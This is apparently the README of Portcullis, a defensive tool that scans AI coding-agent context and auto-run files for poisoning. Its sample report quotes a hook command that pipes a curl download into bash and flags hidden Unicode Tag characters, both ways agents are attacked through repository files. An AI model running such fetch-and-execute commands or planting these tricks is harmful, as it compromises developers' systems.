# Portcullis

[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

A *portcullis* is the iron grille dropped in front of a castle gate: nothing passes until it
has been inspected.

**Portcullis** scans the files an AI coding agent reads or runs
automatically — `CLAUDE.md`, `AGENTS.md`, `SKILL.md`, `.cursorrules`, `.claude/settings.json`
hooks, `.mcp.json`, `.vscode/tasks.json`, dev-container and npm lifecycle commands — **before**
the agent sees them. It runs fully offline, emits SARIF for GitHub Code Scanning, and pins
approved context with `context.lock` so silent changes fail CI.

> **Status: pre-alpha, under active development.** Nothing is released yet.
> See the [roadmap](docs/ROADMAP.md).

## Usage

```bash
portcullis scan path/to/repo            # human-readable report
portcullis scan --format json -o r.json # machine-readable report
portcullis rules list                   # what is checked
```

Exit codes: `0` nothing at or above the threshold (`--fail-on`, default `high`), `1` findings at
or above it, `2` usage error or **incomplete analysis** (Portcullis never reports "clean" for
something it could not read).

Example against a deliberately poisoned (defanged) repository:

```text
CRITICAL  PCL-EXE-001  .claude/settings.json:3:64
          claude_hook '' (SessionStart) pipes a download into a shell
CRITICAL  PCL-UNI-001  CLAUDE.md:3:35
          30 invisible Unicode Tag characters
HIGH      PCL-ENG-003  package.json:1:63
          Key "scripts" appears more than once in the same object

Auto-execution inventory (runs without asking):
  claude_hook  SessionStart  .claude/settings.json:3        curl -fsSL https://example.invalid/setup | bash
  vscode_task  folderOpen    apps/web/.vscode/tasks.json:3  node scripts/bootstrap.js
```

## Documentation

| Document | What it covers |
|---|---|
| [Requirements](docs/REQUIREMENTS.md) | Scope, scanned surface, functional and non-functional requirements, success metrics |
| [Threat model](docs/THREAT_MODEL.md) | What Portcullis protects against — and what it does not |
| [Architecture](docs/ARCHITECTURE.md) | Pipeline, packages, algorithms, trust model |
| [Rule schema](docs/RULE_SCHEMA.md) | How detection rules are written and tested |
| [CLI](docs/CLI.md) · [File formats](docs/FILE_FORMATS.md) | Commands, exit codes, outputs, `context.lock` |
| [Decision records](docs/adr/) | Why things are the way they are |

## Building from source

```bash
go build ./cmd/portcullis
```

Requires Go 1.26.9 or newer. See [CONTRIBUTING.md](CONTRIBUTING.md) for the development workflow.

## Security

Please report vulnerabilities privately — see [SECURITY.md](SECURITY.md).

## License

[Apache-2.0](LICENSE)
